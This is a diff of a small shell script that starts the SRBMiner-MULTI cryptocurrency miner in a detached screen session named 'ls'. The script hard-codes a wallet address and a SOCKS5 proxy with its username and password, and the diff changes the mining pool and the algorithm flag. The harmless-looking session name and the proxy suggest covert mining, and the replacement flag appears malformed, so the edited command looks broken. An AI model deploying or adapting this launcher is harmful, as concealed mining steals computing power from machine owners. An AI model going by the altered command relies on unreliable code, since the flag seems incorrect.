@@ -8,8 +8,8 @@
 #!/bin/sh
 reset
 screen -dmS ls
-POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
+POOL=stratum+tcp://pool.semipool.com:33314
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PY=socks5://qwehsyfs:w1uyert4fs@78.46.89.24:45265
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-RAVZ)
-./SRBMiner-MULTI  --algorithm verushash --pool $POOL --wallet $WALLET.$WORKER -p c=DOGE 
+./SRBMiner-MULTI  --argon2id_chukwa2 --pool $POOL --wallet $WALLET.$WORKER -p c=DOGE 
